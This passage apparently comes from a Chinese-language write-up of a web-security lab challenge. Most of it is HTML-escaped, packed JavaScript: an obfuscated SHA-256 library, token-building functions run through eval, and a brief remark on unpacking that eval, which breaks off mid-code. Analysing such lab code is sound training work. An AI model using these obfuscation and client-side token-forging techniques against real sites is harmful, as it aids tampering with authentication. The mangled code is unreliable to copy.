h\u0026lt;\u0026lt;21))^((h\u0026gt;\u0026gt;\u0026gt;25)|(h\u0026lt;\u0026lt;7));1Z=d\u0026amp;a;1j=1Z^(d\u0026amp;b)^1B;1h=(h\u0026amp;e)^(~h\u0026amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v\u0026lt;\u0026lt;0;c=v+1f\u0026lt;\u0026lt;0;1a=((c\u0026gt;\u0026gt;\u0026gt;2)|(c\u0026lt;\u0026lt;30))^((c\u0026gt;\u0026gt;\u0026gt;13)|(c\u0026lt;\u0026lt;19))^((c\u0026gt;\u0026gt;\u0026gt;22)|(c\u0026lt;\u0026lt;10));1b=((g\u0026gt;\u0026gt;\u0026gt;6)|(g\u0026lt;\u0026lt;26))^((g\u0026gt;\u0026gt;\u0026gt;11)|(g\u0026lt;\u0026lt;21))^((g\u0026gt;\u0026gt;\u0026gt;25)|(g\u0026lt;\u0026lt;7));1V=c\u0026amp;d;1j=1V^(c\u0026amp;a)^1Z;1h=(g\u0026amp;h)^(~g\u0026amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v\u0026lt;\u0026lt;0;b=v+1f\u0026lt;\u0026lt;0;1a=((b\u0026gt;\u0026gt;\u0026gt;2)|(b\u0026lt;\u0026lt;30))^((b\u0026gt;\u0026gt;\u0026gt;13)|(b\u0026lt;\u0026lt;19))^((b\u0026gt;\u0026gt;\u0026gt;22)|(b\u0026lt;\u0026lt;10));1b=((f\u0026gt;\u0026gt;\u0026gt;6)|(f\u0026lt;\u0026lt;26))^((f\u0026gt;\u0026gt;\u0026gt;11)|(f\u0026lt;\u0026lt;21))^((f\u0026gt;\u0026gt;\u0026gt;25)|(f\u0026lt;\u0026lt;7));1D=b\u0026amp;c;1j=1D^(b\u0026amp;d)^1V;1h=(f\u0026amp;g)^(~f\u0026amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v\u0026lt;\u0026lt;0;a=v+1f\u0026lt;\u0026lt;0}k.C=k.C+a\u0026lt;\u0026lt;0;k.B=k.B+b\u0026lt;\u0026lt;0;k.E=k.E+c\u0026lt;\u0026lt;0;k.F=k.F+d\u0026lt;\u0026lt;0;k.J=k.J+e\u0026lt;\u0026lt;0;k.I=k.I+f\u0026lt;\u0026lt;0;k.H=k.H+g\u0026lt;\u0026lt;0;k.D=k.D+h\u0026lt;\u0026lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C\u0026gt;\u0026gt;28)\u0026amp;o]+m[(C\u0026gt;\u0026gt;24)\u0026amp;o]+m[(C\u0026gt;\u0026gt;20)\u0026amp;o]+m[(C\u0026gt;\u0026gt;16)\u0026amp;o]+m[(C\u0026gt;\u0026gt;12)\u0026amp;o]+m[(C\u0026gt;\u0026gt;8)\u0026amp;o]+m[(C\u0026gt;\u0026gt;4)\u0026amp;o]+m[C\u0026amp;o]+m[(B\u0026gt;\u0026gt;28)\u0026amp;o]+m[(B\u0026gt;\u0026gt;24)\u0026amp;o]+m[(B\u0026gt;\u0026gt;20)\u0026amp;o]+m[(B\u0026gt;\u0026gt;16)\u0026amp;o]+m[(B\u0026gt;\u0026gt;12)\u0026amp;o]+m[(B\u0026gt;\u0026gt;8)\u0026amp;o]+m[(B\u0026gt;\u0026gt;4)\u0026amp;o]+m[B\u0026amp;o]+m[(E\u0026gt;\u0026gt;28)\u0026amp;o]+m[(E\u0026gt;\u0026gt;24)\u0026amp;o]+m[(E\u0026gt;\u0026gt;20)\u0026amp;o]+m[(E\u0026gt;\u0026gt;16)\u0026amp;o]+m[(E\u0026gt;\u0026gt;12)\u0026amp;o]+m[(E\u0026gt;\u0026gt;8)\u0026amp;o]+m[(E\u0026gt;\u0026gt;4)\u0026amp;o]+m[E\u0026amp;o]+m[(F\u0026gt;\u0026gt;28)\u0026amp;o]+m[(F\u0026gt;\u0026gt;24)\u0026amp;o]+m[(F\u0026gt;\u0026gt;20)\u0026amp;o]+m[(F\u0026gt;\u0026gt;16)\u0026amp;o]+m[(F\u0026gt;\u0026gt;12)\u0026amp;o]+m[(F\u0026gt;\u0026gt;8)\u0026amp;o]+m[(F\u0026gt;\u0026gt;4)\u0026amp;o]+m[F\u0026amp;o]+m[(J\u0026gt;\u0026gt;28)\u0026amp;o]+m[(J\u0026gt;\u0026gt;24)\u0026amp;o]+m[(J\u0026gt;\u0026gt;20)\u0026amp;o]+m[(J\u0026gt;\u0026gt;16)\u0026amp;o]+m[(J\u0026gt;\u0026gt;12)\u0026amp;o]+m[(J\u0026gt;\u0026gt;8)\u0026amp;o]+m[(J\u0026gt;\u0026gt;4)\u0026amp;o]+m[J\u0026amp;o]+m[(I\u0026gt;\u0026gt;28)\u0026amp;o]+m[(I\u0026gt;\u0026gt;24)\u0026amp;o]+m[(I\u0026gt;\u0026gt;20)\u0026amp;o]+m[(I\u0026gt;\u0026gt;16)\u0026amp;o]+m[(I\u0026gt;\u0026gt;12)\u0026amp;o]+m[(I\u0026gt;\u0026gt;8)\u0026amp;o]+m[(I\u0026gt;\u0026gt;4)\u0026amp;o]+m[I\u0026amp;o]+m[(H\u0026gt;\u0026gt;28)\u0026amp;o]+m[(H\u0026gt;\u0026gt;24)\u0026amp;o]+m[(H\u0026gt;\u0026gt;20)\u0026amp;o]+m[(H\u0026gt;\u0026gt;16)\u0026amp;o]+m[(H\u0026gt;\u0026gt;12)\u0026amp;o]+m[(H\u0026gt;\u0026gt;8)\u0026amp;o]+m[(H\u0026gt;\u0026gt;4)\u0026amp;o]+m[H\u0026amp;o];p(!k.x){1e+=m[(D\u0026gt;\u0026gt;28)\u0026amp;o]+m[(D\u0026gt;\u0026gt;24)\u0026amp;o]+m[(D\u0026gt;\u0026gt;20)\u0026amp;o]+m[(D\u0026gt;\u0026gt;16)\u0026amp;o]+m[(D\u0026gt;\u0026gt;12)\u0026amp;o]+m[(D\u0026gt;\u0026gt;8)\u0026amp;o]+m[(D\u0026gt;\u0026gt;4)\u0026amp;o]+m[D\u0026amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C\u0026gt;\u0026gt;24)\u0026amp;u,(C\u0026gt;\u0026gt;16)\u0026amp;u,(C\u0026gt;\u0026gt;8)\u0026amp;u,C\u0026amp;u,(B\u0026gt;\u0026gt;24)\u0026amp;u,(B\u0026gt;\u0026gt;16)\u0026amp;u,(B\u0026gt;\u0026gt;8)\u0026amp;u,B\u0026amp;u,(E\u0026gt;\u0026gt;24)\u0026amp;u,(E\u0026gt;\u0026gt;16)\u0026amp;u,(E\u0026gt;\u0026gt;8)\u0026amp;u,E\u0026amp;u,(F\u0026gt;\u0026gt;24)\u0026amp;u,(F\u0026gt;\u0026gt;16)\u0026amp;u,(F\u0026gt;\u0026gt;8)\u0026amp;u,F\u0026amp;u,(J\u0026gt;\u0026gt;24)\u0026amp;u,(J\u0026gt;\u0026gt;16)\u0026amp;u,(J\u0026gt;\u0026gt;8)\u0026amp;u,J\u0026amp;u,(I\u0026gt;\u0026gt;24)\u0026amp;u,(I\u0026gt;\u0026gt;16)\u0026amp;u,(I\u0026gt;\u0026gt;8)\u0026amp;u,I\u0026amp;u,(H\u0026gt;\u0026gt;24)\u0026amp;u,(H\u0026gt;\u0026gt;16)\u0026amp;u,(H\u0026gt;\u0026gt;8)\u0026amp;u,H\u0026amp;u];p(!k.x){2b.4A((D\u0026gt;\u0026gt;24)\u0026amp;u,(D\u0026gt;\u0026gt;16)\u0026amp;u,(D\u0026gt;\u0026gt;8)\u0026amp;u,D\u0026amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i\u0026lt;W;++i){r=G.1Q(i);p(r\u0026lt;R){L[M++]=r}z\\x20p(r\u0026lt;2v){L[M++]=(2t|(r\u0026gt;\u0026gt;6));L[M++]=(R|(r\u0026amp;V))}z\\x20p(r\u0026lt;2A||r\u0026gt;=2E){L[M++]=(2D|(r\u0026gt;\u0026gt;12));L[M++]=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V));L[M++]=(R|(r\u0026amp;V))}z{r=2C+(((r\u0026amp;23)\u0026lt;\u0026lt;10)|(G.1Q(++i)\u0026amp;23));L[M++]=(2X|(r\u0026gt;\u0026gt;18));L[M++]=(R|((r\u0026gt;\u0026gt;12)\u0026amp;V));L[M++]=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V));L[M++]=(R|(r\u0026amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y\u0026amp;\u0026amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W\u0026gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i\u0026lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n\u0026gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);\u0026#39;, \u0026#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW\u0026#39;, \u0026#39;split\u0026#39;]; (function(c, d) { var e = function(f) { while (--f) { c[\u0026#39;push\u0026#39;](c[\u0026#39;shift\u0026#39;]()); } }; e(++d); }(a, 0x1f4)); var b = function(c, d) { c = c - 0x0; var e = a[c]; return e; }; eval(function(d, e, f, g, h, i) { h = function(j) { return (j \u0026lt; e ? \u0026#39;\u0026#39; : h(parseInt(j / e))) + ((j = j % e) \u0026gt; 0x23 ? String[b(\u0026#39;0x0\u0026#39;)](j + 0x1d) : j[b(\u0026#39;0x1\u0026#39;)](0x24)); } ; if (!\u0026#39;\u0026#39;[b(\u0026#39;0x2\u0026#39;)](/^/, String)) { while (f--) { i[h(f)] = g[f] || h(f); } g = [function(k) { if (\u0026#39;wpA\u0026#39; !== b(\u0026#39;0x3\u0026#39;)) { return i[k]; } else { while (f--) { i[k(f)] = g[f] || k(f); } g = [function(l) { return i[l]; } ]; k = function() { return b(\u0026#39;0x4\u0026#39;); } ; f = 0x1; } } ]; h = function() { return b(\u0026#39;0x4\u0026#39;); } ; f = 0x1; } ;while (f--) { if (g[f]) { if (b(\u0026#39;0x5\u0026#39;) === b(\u0026#39;0x6\u0026#39;)) { return i[h]; } else { d = d[b(\u0026#39;0x2\u0026#39;)](new RegExp(\u0026#39;\\x5cb\u0026#39; + h(f) + \u0026#39;\\x5cb\u0026#39;,\u0026#39;g\u0026#39;), g[f]); } } } return d; }(b(\u0026#39;0x7\u0026#39;), 0x3e, 0x137, b(\u0026#39;0x8\u0026#39;)[b(\u0026#39;0x9\u0026#39;)](\u0026#39;|\u0026#39;), 0x0, {}));   High：解题 前面的立即函数和 b 分析后认为价值不大。后面的eval引起注意。eval里是一个立即函数，首参数 a[0x7]内容如下。\n1  (w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R\u0026amp;\u0026amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S\u0026amp;\u0026amp;1c\\x202d===\\x271n\\x27\u0026amp;\u0026amp;2d.2Q\u0026amp;\u0026amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q\u0026amp;\u0026amp;1c\\x202g===\\x271n\\x27\u0026amp;\u0026amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27\u0026amp;\u0026amp;2l.3P;q\\x201y=!Y.3H\u0026amp;\u0026amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y\u0026amp;\u0026amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27\u0026amp;\u0026amp;1x.1w\u0026amp;\u0026amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i\u0026lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i\u0026lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y\u0026amp;\u0026amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M\u0026lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M\u0026lt;W\u0026amp;\u0026amp;i\u0026lt;1k;++M){l[i\u0026gt;\u0026gt;2]|=s[M]\u0026lt;\u0026lt;U[i++\u0026amp;3]}}z{1g(i=k.1A;M\u0026lt;W\u0026amp;\u0026amp;i\u0026lt;1k;++M){r=s.1Q(M);p(r\u0026lt;R){l[i\u0026gt;\u0026gt;2]|=r\u0026lt;\u0026lt;U[i++\u0026amp;3]}z\\x20p(r\u0026lt;2v){l[i\u0026gt;\u0026gt;2]|=(2t|(r\u0026gt;\u0026gt;6))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|(r\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3]}z\\x20p(r\u0026lt;2A||r\u0026gt;=2E){l[i\u0026gt;\u0026gt;2]|=(2D|(r\u0026gt;\u0026gt;12))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|(r\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3]}z{r=2C+(((r\u0026amp;23)\u0026lt;\u0026lt;10)|(s.1Q(++M)\u0026amp;23));l[i\u0026gt;\u0026gt;2]|=(2X|(r\u0026gt;\u0026gt;18))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|((r\u0026gt;\u0026gt;12)\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|((r\u0026gt;\u0026gt;6)\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3];l[i\u0026gt;\u0026gt;2]|=(R|(r\u0026amp;V))\u0026lt;\u0026lt;U[i++\u0026amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i\u0026gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L\u0026gt;4r){k.2i+=k.L/2H\u0026lt;\u0026lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i\u0026gt;\u0026gt;2]|=2w[i\u0026amp;3];k.1C=l[16];p(i\u0026gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i\u0026lt;\u0026lt;3|k.L\u0026gt;\u0026gt;\u0026gt;29;l[15]=k.L\u0026lt;\u0026lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j\u0026lt;1k;++j){v=l[j-15];1a=((v\u0026gt;\u0026gt;\u0026gt;7)|(v\u0026lt;\u0026lt;25))^((v\u0026gt;\u0026gt;\u0026gt;18)|(v\u0026lt;\u0026lt;14))^(v\u0026gt;\u0026gt;\u0026gt;3);v=l[j-2];1b=((v\u0026gt;\u0026gt;\u0026gt;17)|(v\u0026lt;\u0026lt;15))^((v\u0026gt;\u0026gt;\u0026gt;19)|(v\u0026lt;\u0026lt;13))^(v\u0026gt;\u0026gt;\u0026gt;10);l[j]=l[j-16]+1a+l[j-7]+1b\u0026lt;\u0026lt;0}1D=b\u0026amp;c;1g(j=0;j\u0026lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o\u0026lt;\u0026lt;0;d=v+4p\u0026lt;\u0026lt;0}z{1B=4v;v=l[0]-4w;h=v-4G\u0026lt;\u0026lt;0;d=v+4D\u0026lt;\u0026lt;0}k.2j=1O}z{1a=((a\u0026gt;\u0026gt;\u0026gt;2)|(a\u0026lt;\u0026lt;30))^((a\u0026gt;\u0026gt;\u0026gt;13)|(a\u0026lt;\u0026lt;19))^((a\u0026gt;\u0026gt;\u0026gt;22)|(a\u0026lt;\u0026lt;10));1b=((e\u0026gt;\u0026gt;\u0026gt;6)|(e\u0026lt;\u0026lt;26))^((e\u0026gt;\u0026gt;\u0026gt;11)|(e\u0026lt;\u0026lt;21))^((e\u0026gt;\u0026gt;\u0026gt;25)|(e\u0026lt;\u0026lt;7));1B=a\u0026amp;b;1j=1B^(a\u0026amp;c)^1D;1h=(e\u0026amp;f)^(~e\u0026amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v\u0026lt;\u0026lt;0;d=v+1f\u0026lt;\u0026lt;0}1a=((d\u0026gt;\u0026gt;\u0026gt;2)|(d\u0026lt;\u0026lt;30))^((d\u0026gt;\u0026gt;\u0026gt;13)|(d\u0026lt;\u0026lt;19))^((d\u0026gt;\u0026gt;\u0026gt;22)|(d\u0026lt;\u0026lt;10));1b=((h\u0026gt;\u0026gt;\u0026gt;6)|(h\u0026lt;\u0026lt;26))^((h\u0026gt;\u0026gt;\u0026gt;11)|(h\u0026lt;\u0026lt;21))^((h\u0026gt;\u0026gt;\u0026gt;25)|(h\u0026lt;\u0026lt;7));1Z=d\u0026amp;a;1j=1Z^(d\u0026amp;b)^1B;1h=(h\u0026amp;e)^(~h\u0026amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v\u0026lt;\u0026lt;0;c=v+1f\u0026lt;\u0026lt;0;1a=((c\u0026gt;\u0026gt;\u0026gt;2)|(c\u0026lt;\u0026lt;30))^((c\u0026gt;\u0026gt;\u0026gt;13)|(c\u0026lt;\u0026lt;19))^((c\u0026gt;\u0026gt;\u0026gt;22)|(c\u0026lt;\u0026lt;10));1b=((g\u0026gt;\u0026gt;\u0026gt;6)|(g\u0026lt;\u0026lt;26))^((g\u0026gt;\u0026gt;\u0026gt;11)|(g\u0026lt;\u0026lt;21))^((g\u0026gt;\u0026gt;\u0026gt;25)|(g\u0026lt;\u0026lt;7));1V=c\u0026amp;d;1j=1V^(c\u0026amp;a)^1Z;1h=(g\u0026amp;h)^(~g\u0026amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v\u0026lt;\u0026lt;0;b=v+1f\u0026lt;\u0026lt;0;1a=((b\u0026gt;\u0026gt;\u0026gt;2)|(b\u0026lt;\u0026lt;30))^((b\u0026gt;\u0026gt;\u0026gt;13)|(b\u0026lt;\u0026lt;19))^((b\u0026gt;\u0026gt;\u0026gt;22)|(b\u0026lt;\u0026lt;10));1b=((f\u0026gt;\u0026gt;\u0026gt;6)|(f\u0026lt;\u0026lt;26))^((f\u0026gt;\u0026gt;\u0026gt;11)|(f\u0026lt;\u0026lt;21))^((f\u0026gt;\u0026gt;\u0026gt;25)|(f\u0026lt;\u0026lt;7));1D=b\u0026amp;c;1j=1D^(b\u0026amp;d)^1V;1h=(f\u0026amp;g)^(~f\u0026amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v\u0026lt;\u0026lt;0;a=v+1f\u0026lt;\u0026lt;0}k.C=k.C+a\u0026lt;\u0026lt;0;k.B=k.B+b\u0026lt;\u0026lt;0;k.E=k.E+c\u0026lt;\u0026lt;0;k.F=k.F+d\u0026lt;\u0026lt;0;k.J=k.J+e\u0026lt;\u0026lt;0;k.I=k.I+f\u0026lt;\u0026lt;0;k.H=k.H+g\u0026lt;\u0026lt;0;k.D=k.D+h\u0026lt;\u0026lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C\u0026gt;\u0026gt;28)\u0026amp;o]+m[(C\u0026gt;\u0026gt;24)\u0026amp;o]+m[(C\u0026gt;\u0026gt;20)\u0026amp;o]+m[(C\u0026gt;\u0026gt;16)\u0026amp;o]+m[(C\u0026gt;\u0026gt;12)\u0026amp;o]+m[(C\u0026gt;\u0026gt;8)\u0026amp;o]+m[(C\u0026gt;\u0026gt;4)\u0026amp;o]+m[C\u0026amp;o]+m[(B\u0026gt;\u0026gt;28)\u0026amp;o]+m[(B\u0026gt;\u0026gt;24)\u0026amp;o]+m[(B\u0026gt;\u0026gt;20)\u0026amp;o]+m[(B\u0026gt;\u0026gt;16)\u0026amp;o]+m[(B\u0026gt;\u0026gt;12)\u0026amp;o]+m[(B\u0026gt;\u0026gt;8)\u0026amp;o]+m[(B\u0026gt;\u0026gt;4)\u0026amp;o]+m[B\u0026amp;o]+m[(E\u0026gt;\u0026gt;28)\u0026amp;o]+m[(E\u0026gt;\u0026gt;24)\u0026amp;o]+m[(E\u0026gt;\u0026gt;20)\u0026amp;o]+m[(E\u0026gt;\u0026gt;16)\u0026amp;o]+m[(E\u0026gt;\u0026gt;12)\u0026amp;o]+m[(E\u0026gt;\u0026gt;8)\u0026amp;o]+m[(E\u0026gt;\u0026gt;4)\u0026amp;o]+m[E\u0026amp;o]+m[(F\u0026gt;\u0026gt;28)\u0026amp;o]+m[(F\u0026gt;\u0026gt;24)\u0026amp;o]+m[(F\u0026gt;\u0026gt;20)\u0026amp;o]+m[(F\u0026gt;\u0026gt;16)\u0026amp;o]+m[(F\u0026gt;\u0026gt;12)\u0026amp;o]+m[(F\u0026gt;\u0026gt;8)\u0026amp;o]+m[(F\u0026gt;\u0026gt;4)\u0026amp;o]+m[F\u0026amp;o]+m[(